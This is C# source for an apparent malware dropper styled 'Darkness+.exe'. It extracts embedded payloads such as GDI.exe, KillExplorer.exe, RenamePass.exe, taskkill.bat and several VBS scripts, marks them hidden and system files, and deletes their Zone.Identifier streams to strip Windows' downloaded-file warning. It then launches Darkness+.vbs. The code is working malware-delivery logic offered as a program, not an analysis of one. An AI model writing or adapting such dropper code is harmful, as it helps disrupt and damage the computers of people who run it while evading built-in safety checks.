using Instalador.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Instalador
{
    public class Program
    {
        static void Extract(string nomeDoNamespace, string caminhoDeSaida, string caminhoInterno, string nomeDoRecurso)
        {
            // Importante. NÃO ALTERE!!!
            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nomeDoNamespace + "." + (caminhoInterno == "" ? "" : caminhoInterno + ".") + nomeDoRecurso))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(caminhoDeSaida + "\\" + nomeDoRecurso, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
            {
                w.Write(r.ReadBytes((int)s.Length));
            }
        }

        // Importante. NÃO ALTERE!!
        // Essa Função Oculta Pastas Tbm!!
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetFileAttributes(string lpFileName, FileAttributes dwFileAttributes);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool DeleteFile(string lpFileName);
        static void OcultarFile(string orgPathFile)
        {

            SetFileAttributes(orgPathFile, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Directory);
            DeleteFile(orgPathFile + ":Zone.Identifier");
        }

        public static void Main()
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(@"
  _____             _                                       
 |  __ \           | |                                      
 | |  | | __ _ _ __| | ___ __   ___  ___ ___   _____  _____ 
 | |  | |/ _` | '__| |/ / '_ \ / _ \/ __/ __| / _ \ \/ / _ \
 | |__| | (_| | |  |   <| | | |  __/\__ \__ \|  __/>  <  __/
 |_____/ \__,_|_|  |_|\_\_| |_|\___||___/___(_)___/_/\_\___|                                                                                                                                                                                                                                                                                                                                                            
");

            Console.WriteLine("Do You Want To Extract The Program??");

            string[] res = {
                    "dance.mp3",
                    "dance.vbs",
                    "error.vbs",
                    "GDI.exe",
                    "img.png",
                    "WallpaperPerson.exe",
                    "img.vbs",
                    "notepad.txt",
                    "restart.vbs",
                    "search.vbs",
                    "taskkill.bat",
                    "RenamePass.exe",
                    "Gdi2.exe",
                    "Gdi3.exe",
                    "KillExplorer.exe",
                };

            while (true)
            {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write("\n\n# (Yes/No): ");
                string input = Console.ReadLine();

                if (input == null || input.Trim() == "")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("Incorrect Option!");
                }
                else if (input.Equals("Yes", StringComparison.OrdinalIgnoreCase))
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("Extracting Files, One Moment...");
                    foreach (var resourcs in res)
                    {
                        Extract("Instalador", Application.StartupPath, "Resources", resourcs);
                        OcultarFile(resourcs);
                    }
                    Extract("Instalador", Application.StartupPath, "Resources", "Darkness+.vbs");
                    Thread.Sleep(3000);
                    Console.WriteLine("Files Extracted Successfully!");
                    Thread.Sleep(2000);
                    Console.WriteLine("Starting Program...");
                    Process.Start("Darkness+.vbs");
                    Thread.Sleep(1000);
                    break;
                }
                else if (input.Equals("No", StringComparison.OrdinalIgnoreCase))
                {
                    Console.ForegroundColor = ConsoleColor.DarkBlue;
                    Console.Clear();
                    Console.WriteLine("Click to Exit the Program, See You Later!");
                    Console.ReadKey();
                    break;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("Incorrect Option!");
                }
            }
        }
    }
}
